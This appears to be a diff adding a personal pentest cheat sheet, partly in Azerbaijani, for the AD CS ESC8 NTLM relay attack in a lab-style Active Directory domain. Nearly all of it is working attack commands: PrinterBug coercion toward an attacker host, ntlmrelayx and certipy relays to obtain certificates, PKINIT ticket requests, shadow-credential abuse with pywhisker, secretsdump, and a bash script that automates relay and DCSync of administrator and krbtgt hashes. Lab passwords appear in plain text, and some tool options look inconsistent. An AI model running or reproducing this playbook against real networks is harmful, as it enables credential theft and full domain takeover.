@@ -1,1 +1,130 @@
+====== General =================================================================================================================================================================
+
+PKINIT 
+( Public Key Cryptography for Initial Authentication ) - X.509 Certifications
+
+AD CS NTLM Relay Hücumu (ESC8) - NTLM Relay istifadə edərək Active Directory Certificate Services-dən (AD CS) başqasının adından autentifikasiya sertifikatı almaqdır.
+
+====== İMPACKET =================================================================================================================================================================
+
+impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+                                 Relax olunacaq Server             ADCS   SMBv2 Sup.  Kerberos üçün istifadə oluna bilən Sertifikat     
+
+====== CERTIPY =================================================================================================================================================================
+
+pip install certipy-ad
+
+# Prerequisites Check
+certipy adcs -u 'DOMAIN\user' -p 'Pass123!' -dc-ip DC_IP domain.local
+certipy adcs -u 'user' -p 'pass' -dc-ip DC_IP -username target_admin
+
+# 1. PrinterBug
+python3 printerbug.py INLANEFREIGHT.LOCAL/<USER>:"<PLAINTEXT_PASSWORD>"@<TARGET_IP> <ATTACKER_IP>
+
+# 2. Gettgtpkinit.py
+git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
+pip3 install -r requirements.txt
+pip3 install -I git+https://github.com/wbond/oscrypto.git
+
+python3 gettgtpkinit.py \
+  -cert-pfx ../krbrelayx/DC01$.pfx \
+  -dc-ip 10.129.234.109 \
+  'inlanefreight.local/dc01$' \
+  /tmp/dc.ccache
+
+export KRB5CCNAME=/tmp/dc.ccache
+
+impacket-secretsdump \
+  -k -no-pass \
+  -dc-ip 10.129.234.109 \
+  -just-dc-user Administrator \
+  'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+
+# 3. Pywhisker
+git clone https://github.com/ShutdownRepo/pywhisker
+pip install -r requirements.txt
+
+python3 pywhisker.py --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+[*] Searching for the target account
+[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
+[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx =========================== PFX Faylı
+[+] PFX exportiert nach: eFUVVTPf.pfx
+[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W ========================================== Password
+[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
+[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+
+python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+
+export KRB5CCNAME=/tmp/jpinkman.ccache
+klist
+
+evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+
+# 4. Relay → Cert
+impacket-ntlmrelayx -t ldaps://DC.domain.local --adcs-device-interface \
+  http://$ATTACKER_IP:9061 --template VulnerableCert -smb2support --quiet &
+
+# 5. Auth və DCSync
+certipy auth -pfx ./certs/abused_cert.pfx -username machine$ -domain domain.local \
+  -dc-ip DC_IP -dcsync domain.local/administrator
+
+
+====== CERTIPY =================================================================================================================================================================
+
+#!/bin/bash
+# =====================================================
+# Certipy ESC8 - Variable Aware (Pro)
+# =====================================================
+
+DOMAIN="domain.local"      # ← Dəyiş
+TARGET="target.host"       # ← Dəyiş  
+DC="10.10.10.10"           # ← Dəyiş
+TEMPLATE="VulnerableCert"  # ← Enum-dan al
+CA="Domain CA"             # ← Enum-dan al
+ATTACKER_IP=$(hostname -I | awk '{print $1}')
+
+mkdir -p certs && \
+echo "$TARGET $ATTACKER_IP\nDC.$DOMAIN $DC" > hosts.txt && \
+python3 printerbug.py "$DOMAIN/relay@$TARGET" "http://$ATTACKER_IP:80" & \
+certipy relay -br -t "ldaps://$DC" -target "CIFS\\$TARGET" \
+  --dns-hosts-file hosts.txt --template "$TEMPLATE" \
+  --template MachineAuth --ca-name "$CA" -lf ./certs/ \
+  --no-validate-certs --quiet & sleep 5 && \
+for cert in ./certs/*.pfx; do
+  echo "[+] DCSync: $cert" && \
+  certipy auth -pfx "$cert" -username "$(basename "$cert" .pfx | sed 's/\..*//')$" \
+    -domain "$DOMAIN" -dc-ip "$DC" \
+    -dcsync "$DOMAIN/administrator,$DOMAIN/krbtgt"
+done
+
+====== PassTheCert =================================================================================================================================================================
+
+git clone https://github.com/AlmondOffSec/PassTheCert/
+
+python3 PassTheCert.py relay -br -t ldaps://10.10.10.10 \
+  --template VulnerableCert --template-name MachineAuth \
+  --ca-name "Domain CA" --dns-hosts-file ./hosts.txt \
+  -lf ./certs/ --no-validate-certs --quiet && \
+  
+sleep 3 && \
+  
+for cert in ./certs/*.pfx; do
+  echo "[+] Abusing: $cert" && \
+  certipy auth -pfx "$cert" -username "$(basename "$cert" .pfx | sed 's/\..*//')$" \
+    -domain domain.local -dc-ip 10.10.10.10 \
+    -dcsync domain.local/administrator,domain.local/krbtgt
+done
+
+python3 printerbug.py domain.local/relay@target.host "http://10.10.14.5:80" & \
+python3 PassTheCert.py relay -br -t ldaps://10.10.10.10 --template VulnerableCert \
+  --dns-hosts-file hosts.txt -lf ./certs/ --quiet & sleep 5 && \
+certipy auth -pfx ./certs/*.pfx -username '*$' -domain domain.local \
+  -dc-ip 10.10.10.10 -dcsync domain.local/administrator
 
